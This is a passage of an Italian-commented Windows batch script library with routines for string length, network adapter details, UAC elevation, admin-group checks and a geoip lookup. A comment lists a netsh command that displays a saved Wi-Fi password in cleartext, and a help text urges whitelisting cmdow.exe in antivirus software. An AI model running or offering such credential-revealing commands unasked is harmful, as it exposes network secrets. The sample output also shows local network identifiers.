	REM echo\::
	REM echo\::
	REM exit /b %ERROR%
REM :function_sos_end

	REM echo scrivi qui lo script da eseguire
	REM echo scrivi qui lo script da eseguire
	REM echo scrivi qui lo script da eseguire
	
	REM if ""%qualche errore per uscire%""==""qualche errore per uscire"" (
		REM set ""ERROR_brevissima_descrizione=spiegazione estesa ma concisa""
		REM echo\::
		REM echo\::  ERRORE bla bla bla
		REM echo\::
		REM call :FOOTER
		REM exit /b %ERROR%
	REM )
	
	REM echo\::::::::::::::::::::::::::::::::::::::::
	REM echo\::%MSG:§=!LF!::%
	REM call :FOOTER
	REM ( 
	REM endlocal
		REM set ""my_VAR_00=%VALORE00_da restituire%""
		REM set ""my_VAR_01=%VALORE01_da restituire%""
		REM exit /b %ERROR%
	REM )
REM :function_end
REM :::::::::::::: function end ::::::::::::::::::::::::::::::::::::::::::
REM :::::::::::::: function end ::::::::::::::::::::::::::::::::::::::::::
REM :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
REM :::::::::::  fine modello per nuove funzioni  :::::::::::::::::::::::::::
REM :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::



:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: STRLEN ::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: STRLEN ::::::::::::::::::::::::::::::::::::::::::::::
goto :STRlen_end
:strlen
:STRLEN_sos
if not ""%~0""=="":STRLEN_sos"" goto :STRLEN_sos_end
	echo\::* %THIS_file% %C__%%~1%C_0% .
	echo\:: la funzione di sos deve iniziare con ""^[:][A-Z0-9]*[_].*""
	echo\::                    deve finire con "".*_sos$""
	echo\:: scrivi qui sos per STRLEN
	echo\::
	echo\::
	echo\::
	echo\::
	exit /b %ERROR%
:strlen_sos_end
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
if ""%2"" == """" (
	set ""ERROR_strlen_need_string=PARAMETRO %%2 necessario""
	echo\::
	echo\::  PARAMETRO %%1 ""%1"" OK
	echo\::  !ERROR_strlen_need_string!
	echo\::  Fornisci una stringa per contarne la lunghezza
	echo\::
	call :FOOTER
	exit /b %ERROR%
)

	set ""STR_4_strlen=#§ç.#!STR_4_strlen:%STRLEN%=!#§ç.#""
	REM echo\:: 0 STR_4_strlen==^|%STR_4_strlen%^|

	set /a N_blank=0
	:STR_4_strlen_loop rimuovo gli spazi iniziali
	REM echo\:: %N_blank% STRLEN==^|%STRLEN%^|
	if ""%STR_4_strlen:~0,6%"" == ""#§ç.# "" (
		set ""STR_4_strlen=!STR_4_strlen:#§ç.# =#§ç.#!""
		set ""STRLEN=!STRLEN! ""
		set /a N_blank+=1
		goto :STR_4_strlen_loop
	)
	set ""STR_4_strlen=%STR_4_strlen:#§ç.#§=§%""
	set ""STR_4_strlen=%STR_4_strlen:§#§ç.#=§%""
	set ""STR_4_strlen=%STR_4_strlen:#§ç.#=%""
	REM echo\:: 1 STR_4_strlen==^|%STR_4_strlen%^|
	REM echo\::
	REM echo\:: -0 STR_4_strlen_ORI==""!STR_4_strlen_ORI!""

	REM set ""STR_4_strlen_ORI=!STR_4_strlen_ORI:�=!""
	set ""STR_4_strlen_ORI=!STR_4_strlen_ORI:""§%STRLEN%=!""
	set ""STR_4_strlen_ORI=!STR_4_strlen_ORI:§""=!""

	echo\::
	echo\:: -1 STR_4_strlen_ORI==!STR_4_strlen_ORI!
	echo\::        STR_4_strlen==%STR_4_strlen%

	call :STRLEN_count
	echo\:: my_STR_length=%_STR_length%

	:STRLEN_count
	if not ""%0""=="":STRLEN_count"" goto :STRLEN_count_end
		set /a len=0
		:STRLEN_count_loop
			if not ""!STR_4_strlen:~%len%!""=="""" set /a len+=1 & goto :STRLEN_count_loop
			set _STR_length=%len%
	goto :EOF
	:STRLEN_count_end
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

	if ""%qualche errore per uscire%""==""qualche errore per uscire"" (
		set ""ERROR_brevissima_descrizione=spiegazione estesa ma concisa""
		echo\::
		echo\::  ERRORE bla bla bla
		echo\::
		call :FOOTER
		exit /b %ERROR%
	)
	
	echo\::::::::::::::::::::::::::::::::::::::::
	echo\::%MSG:§=!LF!::%
	call :FOOTER
	( 
	endlocal
		set ""my_STR_length=%_STR_length%""
		REM set ""my_VAR_01=%VALORE01_da restituire%""
		exit /b %ERROR%
	)
:strlen_end
:::::::::::::: STRLEN end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: STRLEN end ::::::::::::::::::::::::::::::::::::::::::


:::::::::::::: NIC ::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: NIC ::::::::::::::::::::::::::::::::::::::::::::::
goto :nic_end
:NIC
REM setlocal enabledelayedexpansion
:NIC_sos
	if not ""%~0""=="":NIC_sos"" goto :NIC_sos_end
		echo\::* %THIS_file% %C__%%~1%C_0% .
		echo\:: 
		echo\:: per ogni scheda di rete con IP restituisce
		echo\:: alcuni utili valori
		echo\::
		echo\::
	exit /b %ERROR%
:NIC_sos_end
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::: esempio di comando per info su Wi-Fi
::::   Netsh WLAN show interfaces
:::: visualizza la passwd della commessione Wi-Fi
::::    netsh wlan show profile name=""NOME-PROFILO"" key=clear
:::: esempio di risposta al comando:
::::   wmic nic where ""netenabled=true"" get /format:list
::::   da qui prendo il valore
::::   index, macaddress, netconnectionid, speed
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::: AdapterType=Ethernet 802.3
:::: AdapterTypeId=0
:::: AutoSense=
:::: Availability=3
:::: Caption=[00000008] TP-Link Wireless USB Adapter
:::: ConfigManagerErrorCode=0
:::: ConfigManagerUserConfig=FALSE
:::: CreationClassName=Win32_NetworkAdapter
:::: Description=TP-Link Wireless USB Adapter
:::: DeviceID=8
:::: ErrorCleared=
:::: ErrorDescription=
:::: GUID={E8C2B227-0E77-4C38-B35F-46A3C86EBD52}
:::: Index=8
:::: InstallDate=
:::: Installed=TRUE
:::: InterfaceIndex=23
:::: LastErrorCode=
:::: MACAddress=D0:37:45:94:14:58
:::: Manufacturer=Realtek Semiconductor Corp.
:::: MaxNumberControlled=0
:::: MaxSpeed=
:::: Name=TP-Link Wireless USB Adapter
:::: NetConnectionID=Wi-Fi
:::: NetConnectionStatus=2
:::: NetEnabled=TRUE
:::: NetworkAddresses=
:::: PermanentAddress=
:::: PhysicalAdapter=TRUE
:::: PNPDeviceID=USB\VID_2357&amp;PID_011F\00E04C000001
:::: PowerManagementCapabilities=
:::: PowerManagementSupported=FALSE
:::: ProductName=TP-Link Wireless USB Adapter
:::: ServiceName=RtlWlanu
:::: Speed=120000000
:::: Status=
:::: StatusInfo=
:::: SystemCreationClassName=Win32_ComputerSystem
:::: SystemName=HP1864
:::: TimeOfLastReset=20240516075523.500000+120
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
	for /f ""tokens=1,2 delims=^= "" %%a in ('wmic nic where ""netenabled=true"" get /format:list 2^>nul') do (
		set ""Xa=""
		set ""Xb=""
		set ""Xa=%%a""
		set ""Xb=%%b""
		if defined Xb (
			if /i ""%%a"" == ""index"" (
				set  /a N_nic+=1
				set ""_NIC_!N_nic!_%%a=%%b""
			)
			if /i ""%%a"" == ""macaddress"" (
				set ""_NIC_!N_nic!_%%a=%%b""
			)
			if /i ""%%a"" == ""netconnectionid"" ( 
				REM Ethernet - Wi-Fi ....
				set ""_NIC_!N_nic!_%%a=%%b""
			)
			if /i ""%%a"" == ""speed"" ( 
				set ""_NIC_!N_nic!_%%a=%%b""
			)
		)
	)
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
	if not defined N_nic (
		set ""ERROR_no_nic=NO NIC-Network Interface Controller- con IP""
		echo\::
		echo\::  no nic -Network Interface Controller-
		echo\::  nessuna scheda abilitata con IP
		echo\::
		call :FOOTER
		exit /b %ERROR%
	)
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::: esempio di risposta al comando:
::::     wmic nicconfig where (index=""!INDEX_N!"" and macaddress=""!MAC_N!"") get %SEARC_NIC_PROPERTY% /format:list""
:::: Visualizza tutte le proprietà
::::     wmic nicconfig where IPEnabled=TRUE get /format:list
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::: ArpAlwaysSourceRoute=
:::: ArpUseEtherSNAP=
:::: Caption=[00000012] Realtek USB GbE Family Controller
:::: DatabasePath=%SystemRoot%\System32\drivers\etc
:::: DeadGWDetectEnabled=
:::: DefaultIPGateway={""172.28.0.1""}
:::: DefaultTOS=
:::: DefaultTTL=
:::: Description=Realtek USB GbE Family Controller
:::: DHCPEnabled=TRUE
:::: DHCPLeaseExpires=20240516112847.000000+120
:::: DHCPLeaseObtained=20240516085207.000000+120
:::: DHCPServer=172.28.0.1
:::: DNSDomain=lanpareto
:::: DNSDomainSuffixSearchOrder={""lanpareto""}
:::: DNSEnabledForWINSResolution=FALSE
:::: DNSHostName=hp1864
:::: DNSServerSearchOrder={""172.28.0.1""}
:::: DomainDNSRegistrationEnabled=FALSE
:::: ForwardBufferMemory=
:::: FullDNSRegistrationEnabled=TRUE
:::: GatewayCostMetric={0}
:::: IGMPLevel=
:::: Index=12
:::: InterfaceIndex=14
:::: IPAddress={""172.28.5.214"",""fe80::7e5:2359:2836:5bcb""}
:::: IPConnectionMetric=25
:::: IPEnabled=TRUE
:::: IPFilterSecurityEnabled=FALSE
:::: IPPortSecurityEnabled=
:::: IPSecPermitIPProtocols={}
:::: IPSecPermitTCPPorts={}
:::: IPSecPermitUDPPorts={}
:::: IPSubnet={""255.255.0.0"",""64""}
:::: IPUseZeroBroadcast=
:::: IPXAddress=
:::: IPXEnabled=
:::: IPXFrameType=
:::: IPXMediaType=
:::: IPXNetworkNumber=
:::: IPXVirtualNetNumber=
:::: KeepAliveInterval=
:::: KeepAliveTime=
:::: MACAddress=00:E0:4C:68:B7:3D
:::: MTU=
:::: NumForwardPackets=
:::: PMTUBHDetectEnabled=
:::: PMTUDiscoveryEnabled=
:::: ServiceName=rtux64w10
:::: SettingID={9D499C5D-EA64-4740-BC3B-B82065415004}
:::: TcpipNetbiosOptions=0
:::: TcpMaxConnectRetransmissions=
:::: TcpMaxDataRetransmissions=
:::: TcpNumConnections=
:::: TcpUseRFC1122UrgentPointer=
:::: TcpWindowSize=
:::: WINSEnableLMHostsLookup=TRUE
:::: WINSHostLookupFile=
:::: WINSPrimaryServer=172.28.0.1
:::: WINSScopeID=
:::: WINSSecondaryServer=
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
	set ""SEARC_NIC_PROPERTY=DefaultIPGateway^,Description""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,DHCPEnabled""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,DHCPServer""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,DNSDomain""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,DNSDomainSuffixSearchOrder""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,DNSHostName""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,DNSServerSearchOrder""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,IPAddress""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,IPConnectionMetric""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,IPSubnet""
	set ""SEARC_NIC_PROPERTY=%SEARC_NIC_PROPERTY%^,MACAddress""

	echo\:: Network-Interface-Controller
	echo\:: %N_nic% NIC con ip assegnato
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::: Visualizza tutte le proprietà
::::    wmic nicconfig where IPEnabled=TRUE get /format:list
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::
	for /L %%a in (1,1,%N_nic%) do (
		set ""INDEX_N=""
		set ""MAC_N=""
		set ""INDEX_N=!_NIC_%%a_index!""
		set ""MAC_N=!_NIC_%%a_macaddress!""
		for /f ""tokens=1,2 delims=^="" %%A in ('""wmic nicconfig where (index=""!INDEX_N!"" and macaddress=""!MAC_N!"") get %SEARC_NIC_PROPERTY% /format:list""') do (
			set ""Y_A=""
			set ""Y_B=""
			set ""Y_A=%%A""
			set ""Y_B=%%B""
			if defined Y_B (
				set ""Y_B=!Y_B:{=!""
				set ""Y_B=!Y_B:}=!""
				set ""Y_B=!Y_B:""=!""
				set ""Y_B=!Y_B:,=-!""
				set ""_NIC_%%a_!Y_A!=!Y_B!""
			)	
		)
		for /f ""tokens=1,2 delims=^="" %%T in ('set _NIC_%%a') do (
			set ""T=%%T""
			set ""T=!T:_NIC_%%a_=!""
			if /i not  ""!T!"" == ""index""	(
				call :NIC_all_property %%a ""!T!=%%U""
				set ""_NIC_%%a_index=""
			)
		)
	)
:NIC_all_property
	if not ""%0"" == "":NIC_all_property"" goto :NIC_all_property_end  
		set ""X2=%~2""
		set ""_NIC_%1_all_property=""!X2!"" !_NIC_%1_all_property!""
	goto :EOF
:NIC_all_property_end
::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::

::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::
	echo\::::::::::::::::::::::::::::::::::::::::
	for /f ""tokens=*"" %%L in ('set _NIC_') do (
		echo\%%L | findstr /r /c:""_NIC_[0-9]*_all_property"" >nul
		if !errorlevel! EQU 0 (
			set ""DUMMY_nic_prop=%%L""
			set ""DUMMY_nic_prop=!DUMMY_nic_prop:""='!
			call :NIC_all_prop_split ""!DUMMY_nic_prop!""
		) else (
			echo\::  my%%L
		)
	)
:NIC_all_prop_split
	if not ""%0"" == "":NIC_all_prop_split"" goto :NIC_all_prop_split_end
		set ""K=""
		set ""K=%~1""
		set ""K=!K:' '=§!""
		set ""K=!K:'=""!""
		echo\::my%K:§=!LF!::           %
	goto :EOF
:NIC_all_prop_split_end	
::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::	
	
	
	echo\::::::::::::::::::::::::::::::::::::::::
	echo\:: %N_nic% NIC con ip asegnato
	echo\::%MSG:§=!LF!::%
	call :FOOTER
	set ""N=""
	for /f ""tokens=*"" %%G in ('set _NIC_') do (
		REM echo\@@@@@@@ G==%%G
		set /a N+=1
		REM echo N==!N!
		REM if ""!N!"" EQU ""1"" endlocal & endlocal
		if ""!N!"" EQU ""1"" endlocal
		REM echo\@1@1@1@ G==%%G
		set ""my%%G""
	)
	exit /b 0
:nic_end
:::::::::::::: NIC end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: NIC end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: run_as_admin ::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: run_as_admin ::::::::::::::::::::::::::::::::::::::::::::::
goto :run_as_admin_end
:run_as_admin
REM setlocal enabledelayedexpansion
:RUN_AS_ADMIN_sos
if not ""%~0""=="":RUN_AS_ADMIN_sos"" goto :run_as_admin_sos_end
	echo\::* %THIS_file% %C__%%~1%C_0% . & REM %2 .
	echo\:: 
	echo\::  %%2=""path al file da eseguire come Administrators""
	echo\::  %%3=""eventuali parametri da passare""
	echo\::  Spazi vuoti devono essere racchiusi tra "" ""
	echo\::
		if ""%2""==""NO_CMDOW_exe"" (
		echo\::---------------------
		echo\:: %C__%%~1%C_0% Richiede %C__%cmdow.exe%C_0% . ^(funziona anche con powershell^)
		echo\::  CMDOW [Version 1.4.8] Win32 Commandline Window Utility for NT4/2000/XP/7.
		echo\::  ^(C^) Copyright 2001-2014 Ritchie Lawrence, http://www.commandline.co.uk.
		echo\::  https://github.com/ritchielawrence/cmdow/
		echo\::  https://ritchielawrence.github.io/cmdow/
		echo\:: Download: https://github.com/ritchielawrence/cmdow/blob/master/bin/Release/cmdow.exe
		echo\:: 
		echo\:: Molti anrivirus individuano cmdow.exe come virus perchè legge ed elabora
		echo\::  informazioni che %C__%$%C_0%windows%C__%$%C_0% non accetta. Non è vero.
		echo\::-OPEN-SOURCE ""MIT license"" garantisce ciò che cmdow.exe elabora.
		echo\:: Istruisci il tuo antivirus a considerare cmdow.exe un programma sano.
		echo\::  https://github.com/ritchielawrence/cmdow?tab=readme-ov-file#is-cmdow-malware
		echo\::::::::::::::::::::::::::::::::::::::::
	)
	exit /b %ERROR%
:run_as_admin_sos_end
	
:: https://ss64.com/vb/syntax-elevate.html

if ""%~2""§==""""§ (
	set ""ERROR_run_as_admin_P2=Parametro 2 nul""
	echo\::
	echo\:: ""%~1"" Richiesto un percorso completo ad un file
	echo\::  da eseguire in una consolle con privilegi elevati.
	echo\::  Se contiene spazi racchiudere tra "" ""
	echo\::
	call :FOOTER
	exit /b %ERROR%
)

if exist ""%~f2"" (
	if ""%~x2""§==""""§ (
		set ""ERROR_run_as_admin_P2=Parametro 2.NO_estensione""
		echo\::
		echo\:: Richiesto un percorso completo ad un file compreso l'estensione
		echo\:: ""%~2"".NO_estensione??
		echo\::  se contiene spazi racchiudere tra "" ""
		echo\::
		call :FOOTER
		exit /b %ERROR%
	)

	echo\%~f2| findstr /r /c:"".*[ ].*"" >nul 2>&1
		if !errorlevel! EQU 0 (
			set ""_EXE_this=%~sdpnx2""
		) else (
			set ""_EXE_this=%~f2""
		)
)

if not defined _EXE_this (
	set ""ERROR_run_as_admin_P2=Parametro 2 ""%~2"" ""
	echo\::
	echo\:: ""%1"" Richiesto un percorso completo ad un file
	echo\::  da eseguire con permessi elevati ""gruppo Administrators""
	echo\::  Se contiene spazi racchiudere tra "" ""
	echo\::
	call :FOOTER
	exit /b %ERROR%
)

set ""_EXE3=""
set ""Xn=""

shift /1
:loop_p3
shift /1
set ""Xn=%~1""
if defined Xn (
	if exist ""%Xn%"" (
		echo\%Xn%| findstr /r /c:"".*[ ].*"" >nul 2>&1
		REM se trovo spazi vuoti trasformo in nome breve
		if !errorlevel! EQU 0 ( 
			set ""_EXE3=!_EXE3! %~sdpnx1 ""
		) else (
			set ""_EXE3=!_EXE3! %~1 ""
		)
	) else (
		set _EXE3=!_EXE3! %~1
	)
	REM echo\@@!_EXE3!
	set ""Xn=""
	goto :loop_p3
)

REM https://ss64.com/vb/shellexecute.html
      REM OK .ShellExecute ""application"", ""parameters"", ""dir"", ""verb"", window
      REM NO .ShellExecute 'some program.exe', '""some parameters with spaces""', , ""runas"", 1
set ""RUN_AS_ADMIN_time=%time: =0%""
set ""RUN_AS_ADMIN_time=%RUN_AS_ADMIN_time::=%""
set ""RUN_AS_ADMIN_time=%RUN_AS_ADMIN_time:.=%""
set ""RUN_AS_ADMIN_time=%RUN_AS_ADMIN_time:,=%""
REM https://ss64.com/nt/syntax-random.html
REM set /a RUN_AS_ADMIN_random=(%random%*1000/32768+1000)
set /a ""RUN_AS_ADMIN_random=(%random%*100/32768+100)""
set ""RUN_AS_ADMIN_win_title=%THIS_file_pid%-%RUN_AS_ADMIN_time%-%RUN_AS_ADMIN_random%""

set ""_CMD=%comspec%""
set ""_EXE_FULL=%_EXE_this% %_EXE3%""
set ""_VBS=%temp%\dummy.vbs""
set ""_OUT_cmd=%temp%\dummy.cmd""
if exist ""%_VBS%"" del /q /f ""%_VBS%""
if exist ""%_OUT_cmd%"" del /q /f ""%_OUT_cmd%""

::::::::::::::
:::::: file per dare risposta nella consolle elevata
::::::::::::::
echo\@echo off ^& setlocal                                               > %_OUT_cmd%
echo\title %RUN_AS_ADMIN_win_title% ""%username%"" chiama ""%%username%%""  >> %_OUT_cmd%
echo\if ""%%1""==""start"" ^(                                               >> %_OUT_cmd%
echo\	set ""dummy_time_start=start %%date%% %%time: =0%%""              >> %_OUT_cmd%
echo\	set ""dummy_act=esegue""                                          >> %_OUT_cmd%
echo\	set ""dummy_call=chiama""                                         >> %_OUT_cmd%
echo\^)                                                                 >> %_OUT_cmd%
echo\if ""%%1""==""end"" ^(                                                 >> %_OUT_cmd%
echo\	set ""dummy_time_end=end   %%date%% %%time: =0%%""                >> %_OUT_cmd%
echo\	set ""dummy_act=ha eseguito""                                     >> %_OUT_cmd%
echo\	set ""dummy_call=ha chiamato""                                    >> %_OUT_cmd%
echo\^)                                                                 >> %_OUT_cmd%
echo\if ""%%1""==""end"" ^(                                                 >> %_OUT_cmd%
echo\	echo\::--- %%dummy_time_end%% --------                          >> %_OUT_cmd%
echo\^)                                                                 >> %_OUT_cmd%
echo\if ""%%1""==""start"" echo\:::::::::::::::::                           >> %_OUT_cmd%
echo\echo\:: ""%username%"" %%dummy_call%% ""%%username%%""                 >> %_OUT_cmd%
echo\echo\::  utente ""%%username%%"" consolle con permessi elevati       >> %_OUT_cmd%
echo\echo\:: ""%%username%%"" %%dummy_act%%:                              >> %_OUT_cmd%
echo\echo\::   %_EXE_this%                                              >> %_OUT_cmd%
if defined _EXE3 echo\echo\::    %_EXE3%                                >> %_OUT_cmd%
echo\if ""%%1""==""start"" ^(                                               >> %_OUT_cmd%
echo\	echo\::--- %%dummy_time_start%% --------                        >> %_OUT_cmd%
echo\	echo\:: %_EXE_this%                                             >> %_OUT_cmd%
if defined _EXE3 echo\	echo\::  %_EXE3%                                >> %_OUT_cmd%
echo\^)                                                                 >> %_OUT_cmd%
echo\if ""%%1""==""end"" echo\:::::::::::::::::                             >> %_OUT_cmd%
echo\if defined dummy_time_end set ""dummy_time_start=""                  >> %_OUT_cmd%
echo\endlocal ^& set ""dummy_time_start=%%dummy_time_start%%""            >> %_OUT_cmd%
::::::::::::::
:::::: fine file per dare risposta nella consolle elevata
::::::::::::::

echo Set UAC = CreateObject^(""Shell.Application""^) > ""%_VBS%""
echo UAC.ShellExecute ""%_CMD%"","" /K title %RUN_AS_ADMIN_win_title% & cd /d %cd% & call %_OUT_cmd% start & %_EXE_FULL% & call %_OUT_cmd% end & set dummy_time_start="", ""%cd%"", ""runas"", 1 >> ""%_VBS%""
cscript //nologo %_VBS%
if defined CMDOW_exeQ (
	%CMDOW_exe% /p /f | findstr /r /c:"".*%RUN_AS_ADMIN_win_title%"" >nul 2>&1
) else (
	powershell ""Get-Process | Where-Object {$_.mainWindowTitle} | Format-Table Id, Name, mainWindowtitle"" ^
	| findstr /r /c:"".*%RUN_AS_ADMIN_win_title%.*"" >nul 2>&1
)
if %errorlevel% EQU 0 (
	echo\::
	echo\:: ""%username%"" chiede una consolle con permessi elevati
	echo\::  per eseguire %_EXE_this%
	if defined _EXE3 echo\::               %_EXE3%
	echo\::  CONSOLLE ""%RUN_AS_ADMIN_win_title%"" APERTA
	echo\:: 
	REM echo\::::::::::::::::::::::::::::::::::::::::
	REM echo\::%MSG:§=!LF!::%
	call :FOOTER
	
) else (
	set ""ERROR_run_as_admin_NO=UAC richiesta non valida""
	echo\::
	echo\:: CONSOLLE RIFIUTATA
	echo\:: ""%username%"" !ERROR_run_as_admin_NO!
	echo\::  comando UAC %_EXE_this% 
	if defined _EXE3 echo\::   parametri: %_EXE3% .
	echo\::
	echo\:: autenticazione??? ERRORE bla bla bla
	echo\::
	call :FOOTER
	exit /b %ERROR%
)
:run_as_admin_end
:::::::::::::: function end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: function end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: user_is_admin ::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: user_is_admin ::::::::::::::::::::::::::::::::::::::::::::::
goto :user_is_admin_end
:user_is_admin
REM setlocal enabledelayedexpansion
:USER_IS_ADMIN_sos
if not ""%~0""=="":USER_IS_ADMIN_sos"" goto :user_is_admin_sos_end
	echo\::* %THIS_file% %C__%%~1%C_0% .
	echo\::
	echo\::  Controlla su questo computer ""%computername%"" 
	echo\::  se l'utente locale ""%username%"" che esegue questo script
	echo\::  fa parte del gruppo locale ""Users"" oppure ""Administrators""
	echo\::  
	echo\::  Restituisce la var ""my_USER_IS"" valorizzata 
	echo\::  con il gruppo di appartenenza
	exit /b %ERROR%
:user_is_admin_sos_end

	net session /list >nul 2>&1
	set ""is_admin=%errorlevel%""
	set ""my_USER_IS=""
	if %is_admin% EQU 0 (
		for /f ""delims=* tokens=1,2*"" %%A in ('net user %username% ^| findstr /i /r /x /c:""^.*[*]Administrators.*""')  do (
			if !errorlevel! EQU 0 (
				set ""my_USER_IS=%%B""
			)
		)
	)
	if %is_admin% GEQ 1 (
		for /f ""delims=* tokens=1,2*"" %%A in ('net user %username% ^| findstr /i /r /x /c:""^.*[*]Users.*""')  do (
			if !errorlevel! EQU 0 (
				set ""my_USER_IS=%%B""
			)
		)
	)
	if not defined my_USER_IS (
		set ERROR_USER_IS=%username% non é nel gruppo ""*Users"", non é nel gruppo ""*Administrators""
		echo\::
		echo\::  %username% non é nel gruppo ""*Users"", non é nel gruppo ""*Administrators""
		echo\::
		call :FOOTER
		exit /b %ERROR%
	)

	echo\:: utente locale ""%username%"" di questo host ""%computername%""
	echo\:: gruppo locale ""%my_USER_IS: =%""
	echo\:: valore restituito
	echo\::   %%my_USER_IS%%==%my_USER_IS: =%
	echo\::::::::::::::::::::::::::::::::::::::::
	echo\::%MSG:§=!LF!::%
	call :FOOTER
	(
		REM endlocal & endlocal
		endlocal
		set my_USER_IS=%my_USER_IS: =%
	)

:user_is_admin_end
:::::::::::::: user_is_admin end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: user_is_admin end ::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::



:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_geoip start :::::::::::::::::::::::::::::::::::::::::::
:::::::::::::: my_geoip start :::::::::::::::::::::::::::::::::::::::::::
goto :geoip_end
:geoip
REM setlocal enabledelayedexpansion
:GEOIP_sos
if not ""%~0""=="":GEOIP_sos"" goto :geoip_sos_end
	echo\::* %THIS_file% %C__%%~1%C_0% .
	echo\::
	echo\::  Utilizza ""curl.exe"" per interrogare il servizio
	echo\::  web ""http://ip-api.com/json/?fields=66846719""
	echo\:: -Se come parametro si aggiunge un indirizzo ""IP""
	echo\::  oppure un nome a ""DNS"" vengono restituiti i valori
	echo\::  per il l'indirizzo.
	echo\:: -Se non è specificato un'indirizzo i valori restituiti
	echo\::  si riferiscono alla connessione internet in uso.
	echo\:: -Esempio:
	echo\::* %THIS_file% %1
	echo\::   restituisce i valori per la connessione internet in uso.
	echo\::* %THIS_file% %1 8.8.8.8
	echo\::   restituisce i valori per l'indirizzo IP ""8.8.8.8"" 
	echo\::   il DNS pubblico di google
	echo\::* %THIS_file% %1 208.67.222.222
	echo\::   restituisce i valori per l'indirizzo IP ""208.67.222.222"" 
	echo\::   il DNS pubblico di Cisco
	exit /b %ERROR%
:geoip_sos_end

	if exist ""%~dp0curl.exe"" ( 
		echo\:: ""%~dp0curl.exe""
		set ""CURL_exe=%~dp0curl.exe""
	)
	if not defined CURL_exe (
		if exist ""%windir%\system32\curl.exe"" ( 
			REM echo\:: ""%windir%\system32\curl.exe""
			REM :::: ""%windir%\system32"" è un percorso in %path%
			set ""CURL_exe=curl.exe""
		)
	)
	if not defined CURL_exe (
		set ""ERROR_geoip=MANCA ""curl.exe""""
		echo\::
		echo\:: manca curl.exe
		echo\::
		call :FOOTER
		exit /b %ERROR%
	)
	REM trova %computername% ip4
	REM set ""FIND_ip4=[0-9]*[.][0-9]*[.][0-9]*[.][0-9]*""
	REM ping -a -n 1 -4 %computername% | findstr /i /r /c:"".*%computername%.*[%FIND_ip4%]"" & echo error==%errorlevel%
	
	REM trova localhost [::1*
	REM ping -a -n 1 -6 %computername% | findstr /i /r /c:"".*%computername%[ *[:1]*"" & echo %errorlevel%
	
	REM ping -a -n 1 -6 %computername% | findstr /i /r /c:"".*%computername%[ *[fe80:]*"" & echo %errorlevel%
	REM trova connetività su internet
	REM ping -a -n 1 gnu.org | findstr /i /r /c:"".*[[][0-9:].*"" & echo %errorlevel%

	set ""PING_this_2=gnu.org""
	set ""PING_this_1=ip-api.com""
	set ""PING_this=%PING_this_1%""
	REM ping -a -n 1 %PING_this% | findstr /i /r /c:"".*[[][0-9:].*"" >nul
	REM for /f ""tokens=1,2 delims=^="" %%A in ( 'set PING_this_' ) do (
		REM ping -a -n 1 %%B >nul
		REM if !errorlevel! GTR 0 (
			REM set ""ERROR_geoip_no_internet=connessione a internet non disponibile""
			REM set ""NO_PING_this=%%B""
		REM )
		REM if !errorlevel! EQU 0 (
			REM set ""ERROR_geoip_no_internet=""
			REM set ""NO_PING_this=""
		REM )
		REM if defined ERROR_geoip_no_internet (
			REM ping -a -n 1 %%B >nul
			REM if !errorlevel! GTR 0 (
				REM set ""ERROR_geoip_no_internet=connessione a internet non disponibile""
				REM set ""NO_PING_this=%%B""
			REM )
		REM )
	REM )
	REM if defined NO_PING_this (
		REM echo\::
		REM echo\:: connessione a internet non disponibile
		REM echo\:: [ping -a -n 1 %NO_PING_this%] senza risposta
		REM echo\::
		REM call :FOOTER
		REM exit /b %ERROR%
	REM )
